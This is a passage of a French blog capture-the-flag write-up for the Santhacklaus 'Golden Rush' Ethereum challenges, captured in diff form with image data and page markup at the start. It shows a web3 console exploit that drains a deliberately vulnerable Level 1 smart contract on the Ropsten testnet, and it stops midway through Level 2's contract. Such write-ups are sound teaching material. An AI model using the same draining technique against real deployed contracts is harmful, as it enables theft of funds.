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
+MyswMzowMCvbYHQAAAAASUVORK5CYII=" />
+</svg>
+
+  </a>
+
+
+
+
+
+
+</div>
+
+
+
+
+
+
+  <div class="sidebar-item">
+    <p style="font-size: 0.9em;">
+      2018 - 2020 &copy; Adel ALLAM.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Adel ALLAM</a>
+            <small>Blog-notes</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">santhacklaus ctf v2</h1>
+  <span class="post-date">23 Dec 2019</span>
+  <!--more-->
+
+<summary><h3 style="display: inline;">Writeups</h3></summary>
+<ul>
+  <li><a href="#golden-rush">Golden Rush</a></li>
+    <ul>
+        <li><a href="#level-1---donation">Level 1 - Donation</a></li>
+        <li><a href="#level-2---piggybank">Level 2 - PiggyBank</a></li>
+        <li><a href="#level-3---gringotts">Level 3 - Gringotts</a></li>
+        <li><a href="#level-4---wallstreet">Level 4 - WallStreet</a></li>
+        <li><a href="#level-5---thevault">Level 5 - TheVault</a></li>
+    </ul>
+</ul>
+
+<hr />
+
+<h1 id="golden-rush">Golden Rush</h1>
+
+<hr />
+
+<p><strong>Catégorie</strong>: Blockchain</p>
+
+<p><strong>Description</strong>:</p>
+
+<p>GoldenRush is a set of challenges based on  the Ethereum Blockchain technology where you will have to exploit  vulnerable Smart Contracts. Your goal is to steal the money that I sent  on it !</p>
+
+<p>https://goldenrush.santhacklaus.xyz</p>
+
+<p><strong>Auteur</strong>: Ch3n4p4N</p>
+
+<hr />
+
+<h2 id="introduction">Introduction</h2>
+
+<h3 id="metamask">MetaMask</h3>
+
+<p>Pour réussir les challenges, il est nécessaire d’avoir l’extension <a href="https://metamask.io/">MetaMask</a>. Il faudra également créer un compte dans cette dernière.</p>
+
+<p>MetaMask est un wallet de cryptomonaie Ethereum, on va utiliser ce dernier afin de réaliser des transactions. Chaque wallet possède un identifiant, cet identifiant est une suite hexadécimale.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># par exemple</span>
+0x7890720F3e2bA41d7447547Dd4004ed429E944a2
+</code></pre></div></div>
+<p>Cette adresse est par exemple nécessaire lorsque 2 personnes veulent réaliser une transaction.</p>
+
+<h3 id="ropsten-test-network">Ropsten Test Network</h3>
+
+<p>Par défaut, MetaMask utilise la blockchain <strong>Ethereum</strong> (appelé <em>mainnet</em>), nous n’allons pas travailler sur cette dernière puisque pour réaliser des transactions, nous avons besoin d’Ethereum que nous devons acheter.</p>
+
+<p>Il existe alors une autre blockchain appelée <strong>Ropsten Test Network</strong> (ou <em>testnet</em>), cette dernière est par exemple utilisée pendant des phases de développement afin de tester du code avant la mise en production dans la mainnet. Tous les ethers (unité de cette blockchain) que l’on peut avoir n’ont aucune valeur, c’est simplement une simulation pour réaliser des tests. Il faut donc <strong>switcher sur le réseau Ropsten Test Network</strong> sur MetaMask.</p>
+
+<h3 id="remplir-son-wallet">Remplir son wallet</h3>
+
+<p>Il faut maintenant remplir son wallet avec quelques ethers. Pour cela, on peut utiliser un <a href="https://faucet.metamask.io/">faucet</a>. Il faut alors appuyer sur <strong>request 1 ether from faucet</strong>, lors de la première visite, il faudra accepter de connecter son compte MetaMask au site du faucet. Récupérer 2 ou 3 Ether est suffisant pour réussir les challenges.</p>
+
+<h3 id="liens-utiles">Liens utiles</h3>
+
+<ul>
+  <li><a href="https://ropsten.etherscan.io/">Etherscan</a>: c’est un <strong>exploreur du réseau Ropsten</strong>, il permet de suivre des transactions, des smarts contrats et des comptes, le vrai réseau Ethereum est <a href="https://etherscan.io/">ici</a>.</li>
+  <li><a href="https://remix.ethereum.org/">Remix</a>: c’est un IDE Ethereum, ou l’on va écrire notre code en langage Solidity.</li>
+  <li><a href="https://medium.com/coinmonks/write-a-simple-contract-on-top-of-ethereum-92b543594e84">Smart contract avec Remix</a>: exemple d’un smart contract.</li>
+  <li><a href="https://remix-ide.readthedocs.io/en/latest/index.html">Remix documentation</a>: documentation.</li>
+  <li><a href="https://www.youtube.com/watch?v=RHh1qSx7v6w">Video de writups</a></li>
+</ul>
+
+<h3 id="remarques">Remarques</h3>
+
+<p>L’interface graphique de Remix IDE ayant changé récemment, le compiler et le runner ne sont plus disponibles par défaut. Il faudra alors installer le <strong>Solidity compiler</strong> ainsi que <strong>Deploy &amp; run transactions</strong>, pour cela, il faut utiliser le <strong>Plugin manager</strong> pour les installer (logo d’une prise à gauche).</p>
+
+<h3 id="communiquer-avec-un-smart-contract">Communiquer avec un smart contract</h3>
+
+<p>Nous allons utiliser une <strong>console JavaScript</strong> pour communiquer avec les smart contracts. Avant cela, il faut autoriser le domaine sur lequel on veut travailler à utiliser notre compte MetaMask. Pour cela, allez dans l’extension MetaMask, cliquer sur le cercle en haut à droite, Paramètres (ou Settings), Connections puis Connect.</p>
+
+<p>Lancez alors une console JavaScript. Pour tester que votre compte MetaMask est accessible:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="o">--&gt;</span> <span class="s2">"0x7890720f3e2ba41d7447547dd4004ed429e944a2"</span>
+
+<span class="kd">var</span> <span class="nx">me</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p>Vous devriez alors obtenir l’adresse de votre wallet MetaMask. On va definir une variable <code class="highlighter-rouge">me</code> contenant notre adresse de wallet.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">abi</span> <span class="o">=</span> <span class="p">[{</span> <span class="s2">"constant"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="p">...</span> <span class="p">}];</span> <span class="c1">// ABI</span>
+<span class="kd">var</span> <span class="nx">contractAddr</span> <span class="o">=</span> <span class="s2">"0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"</span><span class="p">;</span> <span class="c1">// adresse d'instance</span>
+<span class="kd">var</span> <span class="nx">contract</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">contract</span><span class="p">(</span><span class="nx">abi</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="nx">contractAddr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Sur la page du challenge, après avoir cliqué sur <code class="highlighter-rouge">New Instance</code>et après quelques secondes, une adresse d’instance et un ABI sont fournis. La variable <code class="highlighter-rouge">contract</code>va nous permettre de communiquer avec notre smart contract.</p>
+
+<h3 id="objectif">Objectif</h3>
+
+<p>Le but des 5 challenges est de voler les ethers de chaque contrat deployé.</p>
+
+<h1 id="level-1---donation">Level 1 - Donation</h1>
+
+<p><strong>Points</strong>: 100</p>
+
+<hr />
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">22</span> <span class="o">&lt;</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Donation</span> <span class="p">{</span>
+  <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">funds</span><span class="p">;</span>
+  
+  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+    <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nx">getDonationsFromOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_contractOwner</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">==</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">_contractOwner</span><span class="p">)));</span>
+    <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">funds</span><span class="p">);</span>
+    <span class="nx">funds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="analyse">Analyse</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">&gt;=</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">22</span> <span class="o">&lt;</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>La version de Solidity à utiliser pour la compilation, ici, doit être supérieur ou égale à <code class="highlighter-rouge">0.4.22</code>et inférieur à <code class="highlighter-rouge">0.6.0</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Donation</span> <span class="p">{</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Le squelette d’un smart contract appelé <code class="highlighter-rouge">Donation</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">funds</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">funds</code>:</p>
+
+<ul>
+  <li>un unsigned int de 256 bits (32 octets)</li>
+  <li>public, donc accessible depuis l’extérieur</li>
+</ul>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Constructeur de notre smart contract, <strong>appelé une et une seule fois</strong> lors du déploiement sur la blockchain. Ce dernier initialise <code class="highlighter-rouge">funds</code> à la quantité <code class="highlighter-rouge">msg.value</code>, cette dernière est la quantité d’ether de la transaction pour le déploiement.</p>
+
+<blockquote>
+  <ul>
+    <li><a href="https://solidity.readthedocs.io/en/v0.4.24/units-and-global-variables.html">Units and Globally Available Variables</a></li>
+    <li><code class="highlighter-rouge">msg.value</code> (<code class="highlighter-rouge">uint</code>): number of wei sent with the message.</li>
+  </ul>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>C’est la <strong>fallback function</strong>, de ce smart contract. Une fallback function est une fonction qui n’a pas de nom, il y en a au maximum une dans un smart contract. Elle est appelée en cas d’erreur dans une transaction ou lorsque l’on envoie des ethers au contrat. Dans notre cas, elle se charge simplement d’ajouter les nouveaux fonds que l’on a envoyés dans la transaction.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getDonationsFromOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_contractOwner</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">_contractOwner</span><span class="p">)));</span>
+  <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">funds</span><span class="p">);</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Fonction qui prend une adresse en paramètre, peut être appelée de l’extérieur (<code class="highlighter-rouge">external</code>).</p>
+
+<p>Informations:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">adresse(this)</code>: adresse de l’instance du smart contract</li>
+  <li><code class="highlighter-rouge">abi.encodePacked()</code>: peu importante, utilisé pour de l’encodage</li>
+  <li><code class="highlighter-rouge">keccack256()</code>:  fonction de hachage (SHA3)</li>
+  <li><code class="highlighter-rouge">require(a == b)</code>: condition doit être vérifiée pour continuer l’exécution du code</li>
+  <li><code class="highlighter-rouge">msg.sender.transfer(funds)</code>: envoyer tous les <code class="highlighter-rouge">funds</code>à l’expéditeur ( <code class="highlighter-rouge">msg.sender</code>)</li>
+</ul>
+
+<blockquote>
+  <p><code class="highlighter-rouge">msg.sender</code> (<code class="highlighter-rouge">address</code>): sender of the message (current call)</p>
+</blockquote>
+
+<h4 id="communiquer-avec-notre-smart-contract">Communiquer avec notre smart contract</h4>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">abi</span> <span class="o">=</span> <span class="p">[{</span> <span class="s2">"constant"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="p">...</span> <span class="p">}];</span> <span class="c1">// ABI</span>
+<span class="kd">var</span> <span class="nx">contractAddr</span> <span class="o">=</span> <span class="s2">"0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"</span><span class="p">;</span> <span class="c1">// adresse d'instance</span>
+<span class="kd">var</span> <span class="nx">contract</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">contract</span><span class="p">(</span><span class="nx">abi</span><span class="p">).</span><span class="nx">at</span><span class="p">(</span><span class="nx">contractAddr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">100</span>
+</code></pre></div></div>
+
+<p>Pour accéder à des champs publiques, on faut simplement appeler <code class="highlighter-rouge">contract.champ()</code>. Ci-dessus, on accède au champ <code class="highlighter-rouge">funds</code>, on peut voir que sa valeur est de <code class="highlighter-rouge">100</code>.</p>
+
+<blockquote>
+  <p>PS1: Il faudra toujours ajouter en dernier paramètre, une fonction de callback : <code class="highlighter-rouge">(err,res)=&gt;{console.log(err,res);}</code>.</p>
+
+  <p>PS2: La réponse est un object, il faut déplier ce dernier et regardé le contenu du tableau <code class="highlighter-rouge">c</code>.</p>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// faire une transaction avec 0.0002 ether</span>
+<span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="na">from</span><span class="p">:</span><span class="nx">me</span><span class="p">,</span> <span class="na">to</span><span class="p">:</span><span class="nx">contractAddr</span><span class="p">,</span> <span class="na">value</span><span class="p">:</span><span class="nx">web3</span><span class="p">.</span><span class="nx">toWei</span><span class="p">(</span><span class="mf">0.0002</span><span class="p">)},</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);})</span>
+
+<span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">102</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><code class="highlighter-rouge">from</code>: source (adresse de notre wallet)</p>
+
+  <p><code class="highlighter-rouge">to</code>: destination (adresse du smart contract)</p>
+
+  <p><code class="highlighter-rouge">value</code>: quantité d’ether, va correspondre à <code class="highlighter-rouge">msg.value</code></p>
+</blockquote>
+
+<p>On peut voir que le solde est passé de <code class="highlighter-rouge">100</code>à <code class="highlighter-rouge">102</code>.</p>
+
+<h2 id="attack">Attack</h2>
+
+<p>Il est facile de comprendre que la fonction importante dans ce smart contract est <code class="highlighter-rouge">getDonationsFromOwner()</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getDonationsFromOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_contractOwner</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
+  <span class="nx">require</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">_contractOwner</span><span class="p">)));</span>
+  <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">funds</span><span class="p">);</span>
+  <span class="nx">funds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>C’est cette dernière qui réalise le transfert de tous les fonds à l’expéditeur d’une transaction (<code class="highlighter-rouge">msg.sender</code>). Pour faire cela, il faut que la condition du <code class="highlighter-rouge">require()</code> soit vraie.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">require</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span> <span class="o">==</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">_contractOwner</span><span class="p">)));</span>
+</code></pre></div></div>
+
+<p>Il faut que le paramètre <code class="highlighter-rouge">_contractOwner</code>, soit égale à <code class="highlighter-rouge">address(this)</code>. Le <code class="highlighter-rouge">this</code>correspond au smart contract lui-même. Le <code class="highlighter-rouge">address(this)</code> correspond alors à l’adresse du smart contract. Nous connaissons déjà cette adresse puisqu’elle est donnée dans le challenge.</p>
+
+<blockquote>
+  <p>Autre moyen de la retrouver:</p>
+
+  <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span>
+<span class="o">--&gt;</span> <span class="s2">"0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"</span>
+</code></pre></div>  </div>
+</blockquote>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// avant</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">102</span>
+
+<span class="c1">// payload</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">getDonationsFromOwner</span><span class="p">(</span><span class="s2">"0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"</span><span class="p">,(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+
+<span class="c1">// après</span>
+<span class="nx">contract</span><span class="p">.</span><span class="nx">funds</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">res</span><span class="p">);});</span>
+<span class="o">--&gt;</span> <span class="mi">0</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Il faut patienter quelques secondes avant que la transaction soit validée (attendre la notification de MetaMask).</p>
+</blockquote>
+
+<p>Le smart contract a été dépouillé. On peut alors récupérer notre flag en appuyant sur Check.</p>
+
+<p><code class="highlighter-rouge">SANTA{!!S0Lidi7y_BaSiCs!!}</code></p>
+
+<h1 id="level-2---piggybank">Level 2 - PiggyBank</h1>
+
+<p><strong>Points</strong>: 200</p>
+
+<hr />
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">21</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">PiggyBank</span> <span class="p">{</span>
+    <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">isOwner</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">funds</span><span class="p">;</span>
+    <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">pinHash</span> <span class="o">=</span> <span class="mh">0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c</span><span class="p">;</span>
+    
+    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nx">funds</span> <span class="o">=</span> <span class="nx">funds</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+    <span class="p">}</span>
+    
